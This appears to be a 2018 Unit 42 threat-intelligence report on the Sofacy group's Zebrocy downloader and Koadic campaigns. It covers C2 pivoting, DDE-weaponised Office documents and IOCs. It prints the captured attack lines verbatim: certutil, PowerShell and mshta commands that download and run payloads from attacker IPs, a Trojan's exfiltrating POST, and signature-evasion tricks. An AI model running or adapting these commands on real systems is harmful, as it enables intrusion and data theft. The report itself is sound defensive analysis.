Unit 42 and others have shown in the\nfirst half of 2018 how this threat actor group continues to target multiple organizations\nthroughout the world with a strong emphasis on government, diplomatic and other strategic\norganizations primarily in North America and Europe.\n\n[Following up our most recent Sofacy research in February and](https://blog.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/) [March of 2018, we have](https://blog.paloaltonetworks.com/2018/03/unit42-sofacy-uses-dealerschoice-target-european-government-agency/)\nfound a new campaign that uses a lesser known tool widely attributed to the Sofacy group\ncalled Zebrocy. Zebrocy is delivered primarily via phishing attacks that contain malicious\nMicrosoft Office documents with macros as well as simple executable file attachments. This\n\n\n-----\n\nthird campaign is consistent with two previously reported attack campaigns in terms of\ntargeting: the targets were government organizations dealing with foreign affairs. In this case\nhowever the targets were in different geopolitical regions.\nAn interesting difference we found in this newest campaign was that the attacks using\nZebrocy cast a far wider net within the target organization: the attackers sent phishing emails\nto a an exponentially larger number of individuals. The targeted individuals did not follow any\nsignificant pattern, and the email addresses were found easily using web search engines.\nThis is a stark contrast with other attacks commonly associated with the Sofacy group where\ngenerally no more than a handful of victims are targeted within a single organization in a\nfocus-fire style of attack.\nIn addition to the large number of Zebrocy attacks we discovered, we also observed\n[instances of the Sofacy group leveraging the Dynamic Data Exchange (DDE) exploit](https://en.wikipedia.org/wiki/Dynamic_Data_Exchange)\n[technique previously documented by McAfee. The instances we observed, however, used](https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/)\nthe DDE exploit to deliver different payloads than what was observed previously. In one\ninstance the DDE attack was used to deliver and install Zebrocy. In another instance, the\n[DDE attack was used to deliver an open-source penetration testing toolkit called Koadic. The](https://github.com/zerosum0x0/koadic)\nSofacy group has leveraged open source or freely available tools and exploits in the past but\nthis is the first time that Unit 42 has observed them leveraging the Koadic toolkit.\n\nLinks to previous attacks\nIn our February report, we discovered the Sofacy group using Microsoft Office documents\n[with malicious macros to deliver the SofacyCarberp payload to multiple government entities.](https://blog.paloaltonetworks.com/tag/carberp/)\nIn that report, we documented our observation that the Sofacy group appeared to use\nconventional obfuscation techniques to mask their infrastructure attribution by using random\nregistrant and service provider information for each of their attacks. In particular, we noted\nthat the Sofacy group deployed a webpage on each of the domains. This is odd because\nattackers almost never set up an actual webpage on adversary C2 infrastructure. Even\nstranger, each webpage contained the same content within the body. Since that report, we\ncontinued our research into this oddity. Using this artifact, we were able to pivot and discover\n[another attack campaign using the DealersChoice exploit kit with similar victimology to what](https://blog.paloaltonetworks.com/tag/dealerschoice/)\nwe saw in February. Continuing to use this artifact, we discovered another domain with the\nsame content body, supservermgr[.]com. This domain was registered on December 20, 2017\nand within a few days was resolving to 92.222.136[.]105, which belonged to a well-known\nVPS provider often used by the Sofacy group.\nUnfortunately, at the time of collection, the C2 domain had been sinkholed by a third party.\nBased on dynamic and static analysis of the malware sample associated with the\nsupservermgr[.]com domain however, we were able to determine several unique artifacts\nwhich allowed us to expand our dataset and discover additional findings. First, we\ndetermined the sample we collected, d697160ae… was attempting to communicate to its C2\n[at hxxp://supservermgr[.]com/sys/upd/pageupd.php to retrieve a Zebrocy AutoIT downloader.](https://en.wikipedia.org/wiki/AutoIt)\nBecause the domain had been sinkholed, this activity could not be completed. However, we\nwere able determine a unique, hard-coded user agent used for the C2 communications:\n\n\n-----\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR\n2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)\n\nUsing AutoFocus, we pivoted from the user agent string to expand our data set to three\nadditional Zebrocy samples using the exact same user agent. This led us to additional\ninfrastructure for Zebrocy at 185.25.51[.]198 and 185.25.50[.]93. At this point we had\ncollected nearly thirty samples of Zebrocy in relation to the original sample and its associated\nC2 domain. Additional pivoting based on artifacts unique to this malware family expanded\nour dataset to hundreds of samples used over the last several years. Most of the additional\n[samples were the Delphi and AutoIT variants as reported by ESET. However, several of the](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/)\ncollected samples were a C++ variant of the Zebrocy downloader tool. In addition, we\ndiscovered evidence of a completely different payload in Koadic being delivered as well.\nAlso, we found the IP address 185.25.50[.]93 hosting C2 services for a Delphi backdoor that\nESET's report states is the final stage payload for these attacks.\nA Maltego chart diagramming the relational analysis we performed is below:\n\n_Figure 1 Visualization of relationships_\n\nPlease note this is not a comprehensive chart of all Zebrocy and Koadic samples we were\nable to collect. Only samples mentioned or relevant to the relational analysis have been\nincluded.\n\nFrom the 185.25.50[.]93 C2 IP, we discovered another hard-coded user agent being used by\n\n\n-----\n\nZebrocy:\nMozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko\nWe observed several samples of Zebrocy using this user agent targeting the foreign affairs\nministry of a large Central Asian nation. Pivoting off of this artifact provided us additional\nZebrocy samples. One sample in particular, cba5ab65a… used yet another unique user\nagent string in combination with the previous user agent for its C2:\nMozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\nA malware sample using two separate unique user agent strings is uncommon. A closer\nexamination of the tool revealed the second user agent string was from a secondary payload\nthat was retrieved by the cba5ab65a… sample. Pivoting from the Mozilla v5.1 user agent\nrevealed over forty additional Zebrocy samples, with several again targeting the same\nCentral Asian nation. Two samples specifically, 25f0d1cbc… and 115fd8c61… provided\nadditional artifacts we were able to pivot from to discover weaponized documents to deliver\nZebrocy as well as a Koadic.\nExamining the use of the unique user agents’ strings over time shows that while previously\nonly the Mozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have\nbeen used by the Zebrocy tool for its C2 communications.\n\n_Figure 2 Timeline of User Agents_\n\nDDE Documents\n\nThe two weaponized documents we discovered leveraging DDE were of particular interest\ndue to victimology and a change in tactics.\n\nWhile examining 25f0d1cbc…, we were able to pivot from its C2 220.158.216[.]127 to gather\nadditional Zebrocy samples as well as a weaponized document. This document\n(85da72c7d…) appears to have been targeting a North American government organization\ndealing with foreign affairs. It leveraged DDE to retrieve and install a payload onto the victim\nhost. A decoy document is deployed in this attack, with the contents purporting be a publicly\navailable document from the United Nations regarding the Republic of Uzbekistan.\n\n\n-----\n\n_Figure 3 Example of delivery document_\n\n\n-----\n\n_Figure 4 Lure image used_\n\nThe creator of the weaponized document appended their DDE instructions to the end of the\ndocument after all of the decoy contents. When the document is opened in Word, the\ninstructions are not immediately visible, as Word does not display these fields contents by\n\n\n-----\n\ndefault. As you can see in the following screenshot, simply attempting to highlight the lines in\nwhich the DDE instructions reside does not display them.\n\n_Figure 5 Hidden DDE commands_\n\nEnabling the “Toggle Field Codes” feature reveals the DDE instructions to us and shows that\nthe author had set instructions to size 1 font and with a white coloring. The use of a white\nfont coloring to hide contents within a weaponized document is a technique we had\n[previously reported being used by the Sofacy group in a malicious macro attack.](https://blog.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/)\n\nThe DDE instructions attempt to run the following the following command on the victim host,\nwhich attempts to download and execute a payload from a remote server:\n\n\n1\n2\n3\n4\n5\n\n\nC:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\\nSystem32\\\\rundll32.exe\nC:\\\\Windows\\\\System32\\\\shell32.dll,ShellExec_RunDLL\nC:\\\\Windows\\\\System32\\\\cmd.exe /k certutil -urlcache -split -f\nhxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe\"\n\n\nDuring our analysis, we observed this DDE downloading and executing a Zebrocy AutoIt\ndownloader (f27836430…), configured to attempt to download an additional payload from\n220.158.216[.]127. The DDE instructions also included another command that it did not run,\nwhich suggests it is an artifact of a prior version of this delivery document. The following\nshows this unused command, which exposed an additional server within Sofacy’s\ninfrastructure would download and execute an encoded PowerShell script from\n92.114.92[.]102:\n\n\n1\n2\n3\n4\n5\n\n\nC:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\\nSystem32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -sta -NonI -W\nhidden $e=(New-Object\nSystem.Net.webClient).downloadString('hxxp://92.114.92[.]102:80/d');po\nwershell -enc $e #\n\n\nThe unused command above appears to be related to previous attacks, specifically attacks\n[that occurred in November 2017 as discussed by McAfee and](https://securingtomorrow.mcafee.com/mcafee-labs/apt28-threat-group-adopts-dde-technique-nyc-attack-theme-in-latest-campaign/) [ESET. The payload delivered](https://www.welivesecurity.com/2017/12/21/sednit-update-fancy-bear-spent-year/)\nin these November 2017 attacks using DDE enabled documents was SofacyCarberp, which\ndiffers from the Zebrocy downloader delivered in the February 2018 attacks.\n\n115fd8c61… was another Zebrocy sample we were able to pivot from by gathering additional\nsamples connecting to its C2 86 106 131[ ]177 The additional samples targeted the same\n\n\n-----\n\nlarge Central Asian nation state as previously mentioned but more interestingly, one of the\nsamples was a weaponized document also leveraging DDE and containing a non-Zebrocy\npayload. The payload turned out to be an open source penetration test toolkit called Koadic.\nIt is a toolkit similar to Metasploit or PowerShell Empire and is freely available to anyone on\nGithub.\n\n_Figure 6 Example of delivery document_\n\nThe RTF document (8cf3bc2bf...) was very small in size at 264 bytes, which can be seen in\nits entirety here:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n\n\n{\\rtf1{\\field{\\*\\fldinst DDEAUTO \"C:\\\\\\\\WIndowS\\\\\\\\SYsTem32\\\\\\\\cMD.eXe\n\" \"/C POWErsHELl.eXE -ex   BypaSs -NOP -w   HIdDen (NEwoBjeCT SyStEm.NET.weBCLiENT).dowNloADFILe(\n'hxxp://86.106.131[.]177/link/GRAPH.EXE'\n,    '%apPDAtA%\\graph.exe'  )  ;    saps\n'%Appdata%\\graph.exe'\"}}}\n\n\nThe contents above use the DDE functionality in Microsoft Word to run a PowerShell script to\ndownload the Koadic payload from a remote server, save it as an executable file on the\nsystem and then execute the payload.\n\nConclusion\n\nThe Sofacy group continues their targeted attack campaigns in 2018. As mentioned in this\nblog, Sofacy is carrying out parallel campaigns to attack similar targets around the world but\nwith different toolsets. The Zebrocy tool associated with this current strain of attacks is\nconstructed in several different forms based on the programming language the developer\nchose to create the tool. We have observed Delphi, AutoIt, and C++ variants of Zebrocy, all\nof which are related not only in their functionality, but also at times by chaining the variants\ntogether in a single attack. These attacks are still largely perpetrated via spear phishing\ncampaigns, whether via simple executable attachments in hopes that a victim will launch the\nfile to using a previously observed DDE exploitation technique.\n\nPalo Alto Networks customers are protected from Zebrocy and Koadic attacks by:\n\nAll known Zebrocy samples have a malicious verdict in WildFire\nAutoFocus customers can track this campaign with the following Tags:\n\n[Zebrocy](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ZebrocyDownloader)\n[Koadic](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Koadic)\n\nAppendix\n\n**Zebrocy C++ Variant**\n\nOn February 19, 2018, we saw a spear phishing email sent to a foreign affairs organization\nwithin a Central Asian country, which attempted to delivered an attached Zebrocy\ndownloader (5b5e80f63...) written in the Delphi programming language. This downloader\nobtained a second downloader, which in this case was very similar in functionality but was\nwritten in C++ instead of Delphi.\n\nThis variation of the Zebrocy downloader begins by gathering the serial number for the\nstorage volume with the label \"C:\\\" and the computer name. It then creates an invisible\nwindow (0x0 pixel) in the bottom right corner of the screen, which will call the main function\nof the Trojan.\n\nThe main function of the Trojan interacts with its configured C2 server to obtain additional\ncode to execute. The main function gets pertinent strings to communicate with its C2 by\ncalling a sub-function with a specific number that the sub-function uses as a case within a\nswitch statement to decrypt the desired string. For instance, here are the resulting decrypted\nstrings from each of the case statements (dd7e69e1...):\n\n\n-----\n\nCase - String decrypted\n1 - 185.25.50[.]93\n2 - POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\\r\\nHost:\n185.25.50[.]93\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length:\n3 - porg=\n4 - Content-Length:\nThe Trojan uses raw sockets to communicate with its C2 server and uses the decrypted\nstring above to create HTTP requests. It starts by calling this specific sub-function with an\nargument of 1 to get the IP address for the C2 to connect. It then calls the subfunction with\nthe argument of 2 to get the string that it will use as the HTTP POST request. The main\nfunction then calls the subfunction with the argument 3 to get the POST data parameter\n(“porg”) along with the volume serial number and computer name and will send this data to\nthe C2 via the HTTP POST request. The resulting HTTP POST request looks like the\nfollowing:\nPOST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\nHost: 185.25.50[.]93\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 21\nporg=44908AE0524f422d\nWe have not seen a C2 server respond to our requests during our analysis, however, we do\nknow how the Trojan will parse the C2's response for specific data.\n-1 - Deletes the buffer and exits the Trojan.\n009 - Deletes the buffers and exits the Trojan.\nIf neither of the above values are found at the beginning of the HTTP response, the Trojan\nchecks the C2 response for the ASCII representation of hexadecimal bytes. The Trojan will\nconvert these hexadecimal bytes to their binary values and write them to a file and will run\nthe file using the \"open\" function using the ShellExecuteW API function.\nWe have seen the following HTTP POST parameters within the Zebrocy C++ samples:\nporg\nstructOne\noq\nvolume\n**DDE Details**\nThe author of the DDE document used in the February 2018 attacks used some obfuscation\ntechniques in an attempt to evade detection. First, the DDE instructions heavily rely on the\nQUOTE field, which converts decimal values to their ASCII equivalent character. Also, the\nauthor capitalized the “E” in the “dde” command to evade case sensitive signatures. Lastly,\nthe author bolded the “dd” characters within the “dde” command, which breaks the string up\nwithin the XML of the DOCX file (word/document.xml) to make signature development\ndifficult, as seen here:\n\n\n-----\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n<w:r w:rsidRPr=\"00E84CED\">\n<w:rPr>\n<w:b/>\n<w:noProof/>\n<w:color w:themeColor=\"background1\" w:val=\"FFFFFF\"/>\n<w:sz w:val=\"2\"/>\n<w:szCs w:val=\"2\"/>\n</w:rPr>\n<w:instrText>dd</w:instrText>\n</w:r>\n<w:r w:rsidRPr=\"00E84CED\">\n<w:rPr>\n<w:color w:themeColor=\"background1\" w:val=\"FFFFFF\"/>\n<w:sz w:val=\"2\"/>\n<w:szCs w:val=\"2\"/>\n</w:rPr>\n<w:instrText xml:space=\"preserve\">E </w:instrText>\n</w:r>\n\n\nIn addition to the aforementioned DOCX file, we found another related DDE enabled\ndocument based on an infrastructure overlap with a Zebrocy C2 IP address. This related\ndelivery document was an RTF file that downloaded and installed a payload used to load the\nopen-source Koadic tool. We do not have telemetry on the target or attack vector, but we\nknow the RTF file used DDE to download and execute an executable that loaded Koadic.\nThe payload (abbad7acd...) is an executable that appears to have been created by a\nVBScript to Executable tool and further obfuscated with a cryptor. Our analysis shows some\n[possible ties to the Vbs to Exe tool by F2KO Software but we have yet to confirm a direct](http://www.f2ko.de/en/index.php)\noverlap. We believe the actor used a cryptor on the payload, as it obtains a filename and\nscript from within its resources and decodes these resources by multiplying each byte by\nnegative one. The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc)\nof what appears to be a hardcoded SHA1 hash\n(B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the\nresulting decoded data. For instance, the following data exists within a resource:\nfb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f\nBy multiplying each byte with -1, we obtain the following data:\n05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1\nAfter using RC4 and the key 14331d289e737093994395d3fc412afc, the following cleartext\ndata appears:\n\\x00\\x00\\x00\\x00FlashRun.vbs\nWe do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file\nname to store an embedded VBScript file, such as %Temp%\\4.tmp\\5.vbs. The embedded\nVBScript is retrieved from a resource and decrypted using the same algorithm as discussed\nabove, which results in the following cleartext:\n\n\n-----\n\n1\n2\n\n\nset objshell = createobject(\\\"wscript.shell\\\")\nobjshell.run \\\"mshta hxxp://86.106.131.177:6500/zIZFh\\\",vbhide\n\n\nThe Koadic C2 server will respond to this request with Javascript code that acts as the\nKoadic staging payload, which allows the actor to run additional Koadic modules on the end\nsystem to carry out their post-exploitation activities. Unfortunately, we did not observe the\nKoadic modules used by Sofacy during out analysis.\n\nIOCs\n\n**Domain**\n\nsupservermgr[.]com\n\n**URL**\n\nhxxp://supservermgr[.]com/sys/upd/pageupd.php\n\n**Zebrocy**\n\nd697160aecf152a81a89a6b5a7d9e1b8b5e121724038c676157ac72f20364edc\ncba5ab65a24be52214736bc1a5bc984953a9c15d0a3826d5b15e94036e5497df\n25f0d1cbcc53d8cfd6d848e12895ce376fbbfaf279be591774b28f70852a4fd8\n115fd8c619fa173622c7a1e84efdf6fed08a25d3ca3095404dcbd5ac3deb1f03\nf27836430742c9e014e1b080d89c47e43db299c2e00d0c0801a2830b41b57bc1\n5b5e80f63c04402d0b282e95e32155b2f86cf604a6837853ab467111d4ac15e2\ndd7e69e14c88972ac173132b90b3f4bfb2d1faec15cca256a256dd3a12b6e75d\n\n**Koadic**\n\nabbad7acd50754f096fdc6551e728aa6054dcf8e55946f90a02b17db552471ca\n\n**User Agents**\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR\n2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1)\n\nMozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.3.8 (WinHTTP/5.1) like Gecko\n\nMozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\n\n**IPs**\n\n185.25.51[.]198\n185.25.50[.]93\n220.158.216[.]127\n\n\n-----\n\n92.114.92[.]102\n86.106.131[.]177\n\n**DDE Docs**\n\n85da72c7dbf5da543e10f3f806afd4ebf133f27b6af7859aded2c3a6eced2fd5\n8cf3bc2bf36342e844e9c8108393562538a9af2a1011c80bb46416c0572c86ff\n\n**Get updates from**\n**Palo Alto**\n**Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
